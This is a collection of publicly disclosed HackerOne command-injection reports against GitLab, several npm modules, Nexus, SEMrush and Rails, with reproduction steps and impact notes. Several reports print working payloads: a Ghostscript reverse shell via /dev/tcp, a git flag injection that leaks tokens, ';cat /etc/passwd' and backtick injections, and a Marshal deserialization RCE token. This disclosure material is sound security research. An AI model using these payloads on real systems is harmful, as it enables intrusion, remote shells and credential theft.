Version:	12.0.3
Revision:	08a51a9db93
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.7
URL:		http://4290d4225642
HTTP Clone URL:	http://4290d4225642/some-group/some-project.git
SSH Clone URL:	git@4290d4225642:some-group/some-project.git
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	9.3.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git

## Impact

Truncating arbitrary files and potentially replacing them with known content. This can lead to denial of service, loss of important data, and potential privilege escalation.

---

### [Git flag injection - Search API with scope 'blobs' ](https://hackerone.com/reports/682442)

- **Report ID:** `682442`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** GitLab
- **Reporter:** @vakzz
- **Bounty:** 7000 usd
- **Disclosed:** 2019-12-15T20:21:20.667Z
- **CVE(s):** CVE-2019-15575

**Vulnerability Information:**

As requested from @hackerjuan, breaking this out of https://hackerone.com/reports/658013 for easier tracking.

## Summary
Gitlab 12.1.6 fixed the `wiki_blobs` scope of the search api, but the `blobs` scope is still vulnerable to git flag injection and allows reading any file in `/var/opt/gitlab/gitaly` including `config.toml`.

## Steps to reproduce
Make a search API call setting the `ref` parameter to `--no-index`, `search` to a common character such as `.` or `a`, and `scope` to `blobs`:

```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=blobs&search=.&ref=--no-index

[{"basename":null,"data":"VERSION\u00001\u0000Gitaly, version 1.53.2\n","filename":null,"id":null,"ref":"--no-index","startline":0,"project_id":4},{"basename":null,"data":"config.toml\u00001\u0000# Gitaly configuration file\nconfig.toml\u00002\u0000# This file is managed by gitlab-ctl. Manual changes will be\nconfig.toml\u00003\u0000# erased! To change the contents below, edit /etc/gitlab/gitlab.rb\nconfig.toml\u00004\u0000# and run:\nconfig.toml\u00005\u0000# sudo gitlab-ctl reconfigure\nconfig.toml\u00006\u0000\nconfig.toml\u00007\u0000socket_path = '/var/opt/gitlab/gitaly/gitaly.socket'\nconfig.toml\u00008\u0000bin_dir = '/opt/gitlab/embedded/bin'\nconfig.toml\u00009\u0000\n","filename":null,"id":null,"ref":"--no-index","startline":0,"project_id":4}]
```

The ref parameter ends up being passed to `git grep` and setting it to `--no-index` includes the current working directory and files not managed by git:

```
/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.git grep --ignore-case -I --line-number --null --before-context 2 --after-context 2 --perl-regexp -e a --no-index
```

## Impact

The `config.toml` can contain sensitive information, api keys and tokens. For example on `gitlab.com` it contain the sentry.io api tokens as well as the gitaly token:

```
https://gitlab.com/api/v4/projects/2009901/search?scope=blobs&search=a&ref=--no-index

sentry_dsn = 'https://927bee37df654608xxxxxxxxxxxxxxxx:0324504ee7844264xxxxxxxxxxxxxxxx@sentry.gitlab.net/16
ruby_sentry_dsn = 'https://8ff7dd344e1d4976xxxxxxxxxxxxxxxx:bb9d785b3fe7447bxxxxxxxxxxxxxxxx@sentry.gitlab.net/29

token = 'yfZTE0Oxxxxxxx'
```

I haven't looked into what is possible with the above tokens as potentially there is sensitive information in sentry.io. 

Let me know if you have any questions or require any other information.

Cheers,
Will

## Impact

Read access to any file in `/var/opt/gitlab/gitaly` including `config.toml` which may contain sensitive information, tokens, and API keys

---

### [[open] concatenation of unsanitized input into exec() command](https://hackerone.com/reports/319473)

- **Report ID:** `319473`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @chalker
- **Bounty:** - usd
- **Disclosed:** 2019-12-13T17:06:57.027Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report command injection in `open`.
It allows to inject arbitrary shell commands by specifing crafted urls.

# Module

**module name:** open
**version:** 0.0.5
**npm page:** `https://www.npmjs.com/package/open`

## Module Description

> Open a file or url in the user's preferred application.

## Module Stats

31 293 downloads in the last day
473 107 downloads in the last week
1 968 932 downloads in the last month

~23 627 184 estimated downloads per year

# Vulnerability

## Vulnerability Description

Urls are not properly escaped before concatenating them into the command that is opened using `exec()`.

## Steps To Reproduce:

```js
require("open")("http://example.com/`touch /tmp/tada`");
```

Observe `/tmp/tada/` file created.

Supporting Material/References:

- Arch Linux Current
- Node.js 9.5.0
- npm 5.6.0
- bash 4.4.012

# Wrap up

- I contacted the maintainer to let him know: N 
- I opened an issue in the related repository: N

## Impact

User A who can pass urls for them being `open`-ed on machine B can execute arbitrary shell commands on machine B.

---

### [RCE on default Ubuntu Desktop >= 12.10 Quantal](https://hackerone.com/reports/192512)

- **Report ID:** `192512`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Internet Bug Bounty
- **Reporter:** @donnchac
- **Bounty:** - usd
- **Disclosed:** 2019-11-12T23:49:19.620Z
- **CVE(s):** -

**Vulnerability Information:**

I recently reported a number of vulnerabilities in Canonical's Apport crash report software. These bugs provided RCE on a default install of Ubuntu Desktop >= 12.10 upon opening a malicious file. I reported the issues to the Apport maintainers and we coordinate the disclosure of these issues. 

Is the Internet Bug Bounty interested in providing bounties for RCE bugs affecting default Ubuntu installations? I have included a link to the Launchpad ticket and my blog post describing the issues in detail. Please let me know if this is something that you are interested in. I am happy to provide any further information that you require. 

https://bugs.launchpad.net/bugs/1648806
https://donncha.is/2016/12/compromising-ubuntu-desktop/

---

### [Privilege Escalation From user to SYSTEM via unauthenticated command execution ](https://hackerone.com/reports/544928)

- **Report ID:** `544928`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Ubiquiti Inc.
- **Reporter:** @b0yd
- **Bounty:** - usd
- **Disclosed:** 2019-11-08T16:37:35.196Z
- **CVE(s):** CVE-2019-15595

**Vulnerability Information:**

The vulnerability, or feature depending how you look at it, is the ability to execute commands using the 
evostream API interface that is exposed on localhost:7440. Since the evostream service is running as SYSTEM a user can use the launchprocess command,  http://docs.evostream.com/2.0/launchProcess.html, to execute any binary with supplied arguments. The only thing that is keeping this "feature" from allowing remote code execution is the fact that it listens on localhost only. However, if it were couple with an SSRF, an attacker could achieve full remote code execution.

## Impact

The ability to run arbitrary commands as SYSTEM from any user.

---

### [OS Command Injection in Nexus Repository Manager 2.x(bypass CVE-2019-5475)](https://hackerone.com/reports/688270)

- **Report ID:** `688270`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Central Security Project
- **Reporter:** @badcode_
- **Bounty:** - usd
- **Disclosed:** 2019-10-29T11:03:48.386Z
- **CVE(s):** CVE-2019-15588, CVE-2019-5475

**Vulnerability Information:**

## OS Command Injection in Nexus Repository Manager 2.x(bypass CVE-2019-5475)

# Maven artifact

**groupId:** org.sonatype.nexus.plugins
**artifactId:** nexus-yum-repository-plugin
**version:** 2.14.14-01

# Vulnerability

## Vulnerability Description

The Nexus Yum Repository Plugin is vulnerable to Remote Code Execution. All instances using CommandLineExecutor.java with user-supplied data is vulnerable, such as the Yum Configuration Capability.

## Additional Details

Take a look at the patch for CVE-2019-5475

 https://github.com/sonatype/nexus-public/commit/7b9939e71693422d3e09adc3744fa2e9b3a62a63#diff-4ab0523de106ac7a38808f0231fc8a23R84

![](1.png)

The `getCleanCommand` method is not completely filtered and can still be bypassed.



## Steps To Reproduce:

1. Navigate to "Capabilities" in Nexus Repository Manager.

2. Edit or create a new Yum: Configuration capability

3. Set path of "createrepo" or "mergerepo" to an OS command (e.g. `/bin/bash -c curl${IFS}http://192.168.88.1:8000/ || /createrepo`)

   

![](2.png)



## Supporting Material/References:

- Ubuntu
- Sonatype Nexus Repository Manager 2.14.14-01
- Java 8

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

An authenticated user with sufficient privileges in a Nexus Repository Manager installation can exploit this to execute code on the underlying operating system.

## Impact

An authenticated user with sufficient privileges in a Nexus Repository Manager installation can exploit this to execute code on the underlying operating system.

**Summary (team):**

https://support.sonatype.com/hc/en-us/articles/360033490774-CVE-2019-5475-Nexus-Repository-Manager-2-OS-Command-Injection-2019-08-09

---

### [Mercurial git subrepo lead to arbritary command injection](https://hackerone.com/reports/294147)

- **Report ID:** `294147`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Internet Bug Bounty
- **Reporter:** @criticalonly
- **Bounty:** - usd
- **Disclosed:** 2019-09-26T20:15:09.181Z
- **CVE(s):** CVE-2017-17458

**Vulnerability Information:**

Hi IBB,

I'd like to submit a issue exist in Mercurial.
```
It is possible that a specially malformed repository can cause Git subrepositories to run arbitrary code in 
the form of a .git/hooks/post-update script checked in to the repository in Mercurial 4.4 and earlier. 
Typical use of Mercurial prevents construction of such repositories, but they can be created 
programmatically.
```
Further details of my original report can be found at:
https://bz.mercurial-scm.org/show_bug.cgi?id=5730

And the Mercurial security advisory
https://www.mercurial-scm.org/wiki/WhatsNew#Mercurial_4.4.1_.282017-11-07.29

Thanks,
Terry

## Impact

A crafted mercurial repo with an evil git subrepo can lead to execute arbritary command on user's OS. And other web applications or clients support mercurial repo management or invoke hg related command also have a risk affected by this vulnerability.

---

### [[insideok.ru] Remote Command Execution via file upload.](https://hackerone.com/reports/666716)

- **Report ID:** `666716`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** ok.ru
- **Reporter:** @iframe
- **Bounty:** - usd
- **Disclosed:** 2019-09-20T16:20:26.268Z
- **CVE(s):** -

**Summary (team):**

Incorrect configuration of the insideok.ru web server allowed PHP execution in the directory with user-generated files, which could be used for RCE.

---

### [Local files could be overwritten in GitLab, leading to remote command execution](https://hackerone.com/reports/587854)

- **Report ID:** `587854`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** GitLab
- **Reporter:** @saltyyolk
- **Bounty:** 12000 usd
- **Disclosed:** 2019-07-17T00:23:37.470Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary
#### Arbitrary file overwrite
A new feature (download a directory of a repository) in GitLab 11.11 introduced some changes in `./internal/service/repository/archive.go` of Gitaly.
```go
func handleArchive(ctx context.Context, writer io.Writer, in *gitalypb.GetArchiveRequest, compressCmd *exec.Cmd, format string, path string) error {                                                           
        archiveCommand, err := git.Command(ctx, in.GetRepository(), "archive",                          
                "--format="+format, "--prefix="+in.GetPrefix()+"/", in.GetCommitId(), path) 
...
```

A new parameter `path` is concatenated to the command, the parameter is supposed to carry the path of the directory to be downloaded in the repository. However, Gitaly could be misled by an attacker if the path starts with double dashes, for example:
```shell
$ tree
.
└── --output=
    └── var
        └── opt
            └── gitlab
                └── .ssh
                    └── authorized_keys
                        └── id_ed25519.pub
```

Suppose we have a repository which has only one file `id_ed25519.pub` (contains my pubkey) in directory `--output=/var/opt/gitlab/.ssh/authorized_keys/`. What happens in Gitaly when I click `download directory as tar` under this directory? The actual command get executed here is:
```
git --git-dir=DIR_TO_REPO archive --format tar --prefix=/ COMMIT_ID --output=/var/opt/gitlab/.ssh/authorized_keys
```

The content of the archive gets written to the `/var/opt/gitlab/.ssh/authorized_keys` file instead of transferred to the user.

#### RCE
The reason I choose `tar` as the format is that `tar` doesn't compress the content, all contents in the repository are preserved with some tar headers concatenated into the output.

In the above example:
Content of  `id_ed25519.pub`
```
#
ssh-ed25519 ██████
#
```
Content of  the overwritten `authorized_keys`
```
~/workspace/gitlab/archive$ docker exec -ti e1a bash
root@localhost:/# cat /var/opt/gitlab/.ssh/authorized_keys 
pax_global_header00006660000000000000000000000064134712530140014512gustar00rootroot0000000000000052 comment=412e285af38342030e5e30fcba77cb4296fb245d
archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/000077500000000000000000000000001347125301400244635ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/000077500000000000000000000000001347125301400262525ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/000077500000000000000000000000001347125301400270425ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/opt/000077500000000000000000000000001347125301400276445ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/opt/gitlab/000077500000000000000000000000001347125301400311065ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/opt/gitlab/.ssh/000077500000000000000000000000001347125301400317615ustar00rootroot00000000000000authorized_keys/000077500000000000000000000000001347125301400351135ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/opt/gitlab/.sshid_ed25519.pub000066400000000000000000000001661347125301400373000ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/opt/gitlab/.ssh/authorized_keys#
ssh-ed25519 ████████ 
#
```

SSH server allows dummy content in the `authorized_keys` file, as long as the public keys are started with a new line.

So, after the exploit:
```
$ ssh -i ~/.ssh/id_ed25519 git@10.26.0.3

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$ whoami
git
$ 
```

### Steps to reproduce

As stated above.

### Impact

For most self-hosted single instance GitLab users, this is a RCE issue.

For those who has Gitaly running in different OS with gitlab-shell, the impact varies and depends on different circumstances.

For GitLab.com, as the described PoC is destructive and it's hard to observe if I choose some other files to overwrite. I didn't test and I want to leave the evaluation of impact to you guys. :p

#### Results of GitLab environment info
```
root@localhost:/# gitlab-rake gitlab:env:info

System information
System:		
Current User:	git
Using RVM:	no
Ruby Version:	2.5.3p105
Gem Version:	2.7.9
Bundler Version:1.17.3
Rake Version:	12.3.2
Redis Version:	3.2.12
Git Version:	2.21.0
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	11.11.0
Revision:	3e8ca2fb781
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	9.6.11
URL:		http://10.26.0.3
HTTP Clone URL:	http://10.26.0.3/some-group/some-project.git
SSH Clone URL:	git@10.26.0.3:some-group/some-project.git
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: 

GitLab Shell
Version:	9.1.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

OS command injections usually lead to serious results, remote code execution in this case.

---

### [Remote Code Execution on www.semrush.com/my_reports on Logo upload](https://hackerone.com/reports/403417)

- **Report ID:** `403417`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Semrush
- **Reporter:** @fransrosen
- **Bounty:** - usd
- **Disclosed:** 2019-06-24T16:57:38.655Z
- **CVE(s):** -

**Vulnerability Information:**

The Logo upload in the report constructor at: https://www.semrush.com/my_reports/constructor

{F340480}

is passed through a not properly patched version of ImageMagick. You can use Postscript to get Ghostscript to run which in return allows to trigger arbitrary commands on the server, leading to Remote Code Execution. Tavis Ormandy has also mentioned recently that the policy.xml needs to disable EPS,PS,PDF and XPS since all these have ways to trigger Ghostscript: http://openwall.com/lists/oss-security/2018/08/21/2

The following PoC-payload was used to get a reverse shell when issuing the upload:

Save it as `test.jpg` and upload it as an image for the logo:

```
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/███/8080 0>&1') currentdevice putdeviceprops
```

(`█████` is the IP of my listener)

This resulted in:

```
█████████
██████████
ls
███████
██████████
app
████████
██████████
████
████████
██████
███
█████████
████████
██████
█████████
█████████
█████
██████████
█████
██████
█████████
███
█████
██████
████
█████
█████████
███████
████████
███
███


███
whoami
████
███████
██████
```

At this point I wasn't sure if this was a third party or not, so I checked two things:

## `██████` to list files in the ██████ dir. It showed me:

```
█████████
███
████████
████████
███████
█████
████
█████████
████
██████████
```

I navigated to 

```
https://www.semrush.com/my_reports/████
https://www.semrush.com/my_reports/████████
```

And confirmed those two files exists in this directory.

## `/etc/hosts`

This one confirmed it by:

```
cat /etc/hosts
127.0.0.1 localhost
█████ ████.semrush.net ███
████████ ███████
```

I'm certain this is a SEMrush-instance.

{F340481}

You should urgently make sure your policy.xml for imagemagick ONLY allows gif,jpg,png and nothing else.

Regards,
Frans

## Impact

#

---

### [RCE which may occur due to `ActiveSupport::MessageVerifier` or `ActiveSupport::MessageEncryptor` (especially Active storage)](https://hackerone.com/reports/473888)

- **Report ID:** `473888`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** Ruby on Rails
- **Reporter:** @ooooooo_q
- **Bounty:** 1500 usd
- **Disclosed:** 2019-03-13T19:41:52.199Z
- **CVE(s):** CVE-2019-5420

**Vulnerability Information:**

Since `ActiveSupport::MessageVerifier` and `ActiveSupport::MessageEncryptor` use Marshal as the default serializer, I confirmed that RCE is possible by object injection.


```ruby
# https://github.com/rails/rails/blob/v5.2.2/activesupport/lib/active_support/message_verifier.rb#L110
    def initialize(secret, options = {})
      raise ArgumentError, "Secret should not be nil." unless secret
      @secret = secret
      @digest = options[:digest] || "SHA1"
      @serializer = options[:serializer] || Marshal
    end
```

```ruby
# https://github.com/rails/rails/blob/v5.2.2/activesupport/lib/active_support/message_encryptor.rb#L145
def initialize(secret, *signature_key_or_options)
  options = signature_key_or_options.extract_options!
  sign_secret = signature_key_or_options.first
  @secret = secret
  @sign_secret = sign_secret
  @cipher = options[:cipher] || self.class.default_cipher
  @digest = options[:digest] || "SHA1" unless aead_mode?
  @verifier = resolve_verifier
  @serializer = options[:serializer] || Marshal
end
```

Especially in Rails 5.2 and later, `ActiveSupport::MessageVerifier` is used to validate the URL used in Active Storage, and attacks are possible.


```ruby
# https://github.com/rails/rails/blob/v5.2.2/activestorage/lib/active_storage/engine.rb#L81
initializer "active_storage.verifier" do
  config.after_initialize do |app|
    ActiveStorage.verifier = app.message_verifier("ActiveStorage")
  end
end
```

```ruby
# https://github.com/rails/rails/blob/v5.2.2/activestorage/app/controllers/active_storage/disk_controller.rb#L38
def decode_verified_key
  ActiveStorage.verifier.verified(params[:encoded_key], purpose: :blob_key)
end
```

It is also used in `ActiveStorage::Blob.find_signed`.
Also, these URLs can be accessed without using Active Storage.

### PoC

#### 1. Prepare server

```
$ ruby -v
ruby 2.6.0p0 (2018-12-25 revision 66547) [x86_64-darwin16]

$ rails -v
Rails 5.2.2

$ rails new verifier_rce
$ cd verifier_rce/
$ bundle install
```

```
# Active Storage is not installed, but routes is usable
$ bin/rails routes
Prefix Verb URI Pattern                                                                              Controller#Action
rails_service_blob GET  /rails/active_storage/blobs/:signed_id/*filename(.:format)                               active_storage/blobs#show
rails_blob_representation GET  /rails/active_storage/representations/:signed_blob_id/:variation_key/*filename(.:format) active_storage/representations#show
rails_disk_service GET  /rails/active_storage/disk/:encoded_key/*filename(.:format)                              active_storage/disk#show
update_rails_disk_service PUT  /rails/active_storage/disk/:encoded_token(.:format)                                      active_storage/disk#update
rails_direct_uploads POST /rails/active_storage/direct_uploads(.:format)                                           active_storage/direct_uploads#create
```

#### 2. Prepare payload

```ruby
$ ls /tmp/rce
ls: /tmp/rce: No such file or directory

$ bundle exec rails console
Running via Spring preloader in process 66998
Loading development environment (Rails 5.2.2)

irb(main):001:0> # emulate verifier
=> nil
irb(main):002:0> app_class_name = VerifierRce::Application.name
=> "VerifierRce::Application"
irb(main):003:0> secret_key_base = Digest::MD5.hexdigest(VerifierRce::Application.name)
=> "7e485df67863e85e584b3feecb22276d"
irb(main):004:0> key_generator = ActiveSupport::CachingKeyGenerator.new(ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000))
=> #<ActiveSupport::CachingKeyGenerator:0x00007ff55ac60d48 @key_generator=#<ActiveSupport::KeyGenerator:0x00007ff55ac60d98 @secret="7e485df67863e85e584b3feecb22276d", @iterations=1000>, @cache_keys=#<Concurrent::Map:0x00007ff55ac60cf8 entries=0 default_proc=nil>>
irb(main):005:0> secret = key_generator.generate_key("ActiveStorage")
=> "\xB09\x11u/6#\x04\xE6\x15\x9C_\xBB\xE8\x94\xD0pn<\xFD\x15\x85\x95\x8BR\x82\x13\xCA\xC3\xDE\xAEB\x98\xDA\v\xD6+jI\xE6\x80\x9E\xC8$e\xE8(\xD5\x98\x82\x1FVy1\x9D>R\xAE\x9D\xAE\x88\xF1\xBA,"
irb(main):006:0> verifier = ActiveSupport::MessageVerifier.new(secret)
=> #<ActiveSupport::MessageVerifier:0x00007ff558aaee20 @secret="\xB09\x11u/6#\x04\xE6\x15\x9C_\xBB\xE8\x94\xD0pn<\xFD\x15\x85\x95\x8BR\x82\x13\xCA\xC3\xDE\xAEB\x98\xDA\v\xD6+jI\xE6\x80\x9E\xC8$e\xE8(\xD5\x98\x82\x1FVy1\x9D>R\xAE\x9D\xAE\x88\xF1\xBA,", @digest="SHA1", @serializer=Marshal, @options={}, @rotations=[]>
irb(main):007:0>


irb(main):008:0> # https://medium.com/@u0x/marshall-unserialization-exploit-for-ruby-on-rails-5-1-4-979475cfdba0
=> nil
irb(main):009:0> code = '`touch /tmp/rce`'
=> "`touch /tmp/rce`"
irb(main):010:0> erb = ERB.allocate
=> #<ERB:0x00007ff55acabdc0>
irb(main):011:0> erb.instance_variable_set :@src, code
=> "`touch /tmp/rce`"
irb(main):012:0> erb.instance_variable_set :@filename, "1"
=> "1"
irb(main):013:0> erb.instance_variable_set :@lineno, 1
=> 1
irb(main):014:0> dump_target  = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result
=> ""
irb(main):015:0>

irb(main):016:0> verifier.generate(dump_target, purpose: :blob_key)
=> "eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHZPa0JCWTNScGRtVlRkWEJ3YjNKME9qcEVaWEJ5WldOaGRHbHZiam82UkdWd2NtVmpZWFJsWkVsdWMzUmhibU5sVm1GeWFXRmliR1ZRY205NGVRazZEa0JwYm5OMFlXNWpaVzg2Q0VWU1FnZzZDVUJ6Y21OSkloVmdkRzkxWTJnZ0wzUnRjQzl5WTJWZ0Jqb0dSVlE2RGtCbWFXeGxibUZ0WlVraUJqRUdPd2xVT2d4QWJHbHVaVzV2YVFZNkRFQnRaWFJvYjJRNkMzSmxjM1ZzZERvSlFIWmhja2tpREVCeVpYTjFiSFFHT3dsVU9oQkFaR1Z3Y21WallYUnZja2wxT2g5QlkzUnBkbVZUZFhCd2IzSjBPanBFWlhCeVpXTmhkR2x2YmdBR093bFUiLCJleHAiOm51bGwsInB1ciI6ImJsb2Jfa2V5In19--78c21ddf5ca4239d862118730069e04fbf38fd3d"
```

```
# Confirm that the file was generated due to the side effect of creating payload
$ ls /tmp/rce
/tmp/rce

# Erase the file as it disturbs the operation check
$ rm /tmp/rce
$ ls /tmp/rce
ls: /tmp/rce: No such file or directory
```

#### 3. Attack

Start server.

```
$ bin/rails s
```

Open URL in browser.
(`GET  /rails/active_storage/disk/:encoded_key/*filename`, use payload for `:encoded_key`)

```
http://0.0.0.0:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHZPa0JCWTNScGRtVlRkWEJ3YjNKME9qcEVaWEJ5WldOaGRHbHZiam82UkdWd2NtVmpZWFJsWkVsdWMzUmhibU5sVm1GeWFXRmliR1ZRY205NGVRazZEa0JwYm5OMFlXNWpaVzg2Q0VWU1FnZzZDVUJ6Y21OSkloVmdkRzkxWTJnZ0wzUnRjQzl5WTJWZ0Jqb0dSVlE2RGtCbWFXeGxibUZ0WlVraUJqRUdPd2xVT2d4QWJHbHVaVzV2YVFZNkRFQnRaWFJvYjJRNkMzSmxjM1ZzZERvSlFIWmhja2tpREVCeVpYTjFiSFFHT3dsVU9oQkFaR1Z3Y21WallYUnZja2wxT2g5QlkzUnBkbVZUZFhCd2IzSjBPanBFWlhCeVpXTmhkR2x2YmdBR093bFUiLCJleHAiOm51bGwsInB1ciI6ImJsb2Jfa2V5In19--78c21ddf5ca4239d862118730069e04fbf38fd3d/test
```

Confirm that the file was created.

```
$ ls /tmp/rce
/tmp/rce
```

## Impact

If the server is running in development mode with version 5.2 or later, if the attacker can know application name, `secret_key_base` can be obtained, so RCE can be easily done by accessing the URL.
In production mode, an attacker needs to know `secret_key_base`.

For versions less than 5.2, attacks are possible only if the user is able to input places using `ActiveSupport::MessageVerifier` or `ActiveSupport::MessageEncryptor` and the attacker knows `secret_key_base`.

### proposed measures

- Use `JSON.load` or `Yaml.safe_load` without using Marshal
- Disable access to URL if Active Storage is not used

---

### [Command Injection Vulnerability in kill-port Package](https://hackerone.com/reports/389561)

- **Report ID:** `389561`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @cris_semmle
- **Bounty:** - usd
- **Disclosed:** 2019-01-06T00:18:52.269Z
- **CVE(s):** CVE-2019-5414

**Vulnerability Information:**

I would like to report a command injection vulnerability in kill-port. It allows an attacker to inject arbitrary commands. 

# Module

**module name:** kill-port
**version:** 1.3.1
**npm page:** `https://www.npmjs.com/package/kill-port`

## Module Description

 Kill the process running on given port

## Module Stats

5,282 downloads in the last week

# Vulnerability

## Vulnerability Description

If an attacker can control the port, which in itself is a very sensitive value, he can inject arbitrary OS commands due to the usage of exec in a third-party module.

## Steps To Reproduce:

```js
const kill = require('kill-port');
kill("23;`touch ./success.txt; 2222222222`");
```

## Patch

N/A replace exec (through execa.shell) with spawn

## Supporting Material/References:

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

She can inject arbitrary commands. However, I assume that the real impact is not that high, since for most usages of the package I do not expect the user to be able to control the port value.

---

### [h1-5411-CTF report: LFI / Deserialization / XXE vulnerability, ](https://hackerone.com/reports/415233)

- **Report ID:** `415233`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** h1-5411-CTF
- **Reporter:** @apox
- **Bounty:** - usd
- **Disclosed:** 2018-10-22T16:04:50.397Z
- **CVE(s):** -

**Vulnerability Information:**

> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

**Summary:** 
h1-5411-ctf write-up

The CTF contained a Local File inclusion that enabled the attacker to read .php files (among others) from the server and by doing so, it helped to find out PHP serialization bug and the XXE vulnerability that was used as SSRF to exploit the hidden maintenance pages.

Flag: ```flag{cha1n1ng_bugs_f0r_fun_4nd_pr0f1t?_or_rep0rt_an_LF1}```


**Description:** 
See attached .pdf file.

## Steps To Reproduce:
See attached .pdf file.

## Supporting Material/References:
See attached .pdf file.

## Impact

Flag was found!

---

### [[apex-publish-static-files] Command Injection on connectString](https://hackerone.com/reports/405694)

- **Report ID:** `405694`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @abdilahrf_
- **Bounty:** - usd
- **Disclosed:** 2018-10-18T18:32:08.981Z
- **CVE(s):** CVE-2018-16462

**Vulnerability Information:**

I would like to report a command injection vulnerability in the apex-publish-static-files npm module.
It allows arbitrary shell command execution through a maliciously crafted argument.

# Module

**module name:** apex-publish-static-files
**version:** 2.0.0
**npm page:** `https://www.npmjs.com/package/apex-publish-static-files`

## Module Description

>Uploads all files from a local directory to Oracle APEX

## Module Stats

15 downloads in the last day
~170 downloads in the last month

# Vulnerability

## Vulnerability Description

apex-publish-static-files does not sanitize the connectionString argument, and subsequently passes it to execSync(), thus allowing arbitrary shell command injection. 

Vulnerability Code : [https://github.com/vincentmorneau/apex-publish-static-files/blob/master/index.js#54-66](https://github.com/vincentmorneau/apex-publish-static-files/blob/master/index.js#54-66)

```
			const childProcess = execSync(
				'"' + opts.sqlclPath + '"' + // Sqlcl path
				' ' + opts.connectString + // Connect string (user/pass@server:port/sid)
				' @"' + path.resolve(__dirname, 'lib/script') + '"' + // Sql to execute
				' "' + path.resolve(__dirname, 'lib/distUpload.js') + '"' + // Param &1 (js to execute)
				' "' + path.resolve(opts.directory) + '"' + // Param &2
				' ' + opts.appID + // Param &3
				' "' + opts.destination + '"' + // Param &4
				' "' + opts.pluginName + '"' // Param &5
				, {
					encoding: 'utf8'
				}
			);
```


## Steps To Reproduce:

- npm i apex-publish-static-files
- create index.js file like this :

```
var publisher = require('apex-publish-static-files');
 
publisher.publish({
connectString: ";cat /etc/passwd ;",
    directory: "public",
    appID: 111
});
```
- execute `node index.js`

F342500

## Supporting Material/References:

OS: WSL Ubuntu 16.04
NODE: v10.8.0
NPM : 6.2.0


# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

It allows arbitrary shell command execution through a maliciously crafted argument.

**Summary (team):**

vulnerable_versions <= 2.0.0
patched versions >= 2.0.1

---

### [Cisco RCE](https://hackerone.com/reports/411270)

- **Report ID:** `411270`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Informatica
- **Reporter:** @neolead
- **Bounty:** - usd
- **Disclosed:** 2018-09-21T10:08:29.883Z
- **CVE(s):** -

**Summary (team):**

The researcher was able to complete RCE attack and download sensitive files. We have mitigated it by hardening the machine and port.

**Summary (researcher):**

There are opened classical cisco smart install service, which was successfully exploited.
Informatica is a fAsTeSt!!! bug fixer in my life.
Closing vulnerability in a 3-5 hours..!
And closing report in a day!
Gratz!

---

